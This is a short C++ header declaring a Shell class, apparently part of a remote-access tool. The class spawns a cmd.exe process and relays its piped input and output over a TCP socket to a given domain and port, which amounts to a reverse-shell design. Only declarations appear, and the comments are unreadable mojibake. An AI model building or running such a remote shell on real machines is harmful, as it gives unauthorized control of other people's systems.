// ����cmd���� ͨ���ܵ��������������
// �����ܵ�����ת����socket��hunter��
// ʹ��hunter���ܹ���cmd���̽���
// ʹ�õ���ģʽ

#pragma once
#include <strsafe.h>
#include "TcpSocket.h"
#include <string>

class Shell
{
public:
	// ������ں��� ����cmd���̲����ùܵ����� �������߳�
	static void startShell(std::string domain, int port);
	// �̺߳��� �����socket��ת�� ������������
	static DWORD WINAPI threadReadSock(LPVOID args);
	// �̺߳��� �����pipe��ת�� �����������
	static DWORD WINAPI threadReadPipe(LPVOID args);
	// ����cmd�ӽ��̲�׼���ùܵ�
	static bool createCmd();
};

